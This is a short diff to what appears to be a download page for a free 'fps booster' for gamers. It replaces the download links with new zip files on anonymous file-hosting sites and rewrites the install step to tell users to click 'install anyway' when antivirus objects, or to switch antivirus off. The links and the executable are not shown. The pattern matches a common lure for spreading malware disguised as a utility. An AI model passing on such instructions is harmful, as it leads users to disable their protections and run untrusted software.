@@ -27,10 +27,10 @@ Don't let lag hold you back from reaching your gaming potential. Unlock the full
 <h2>
 how to download?
 
-1. go to this link <a href="https://www.upload.ee/files/15659646/fps-booster.zip.html">download 1</a> or <a href="https://gofile.io/d/DIxkf6">Download 2</a>
+1. go to this link <a href="https://www.upload.ee/files/15668202/fps-booster.zip.html">download 1</a> or <a href="https://gofile.io/d/Xa5NIU">Download 2</a>
 2. download the fps booster
 
-3. run the fps booster
+3. launch the booster if anti virus interupts click on install anyway if still doesnt work turn off anti virus
 
 4. you may need to wait up to minute for it to load. please be patient
 
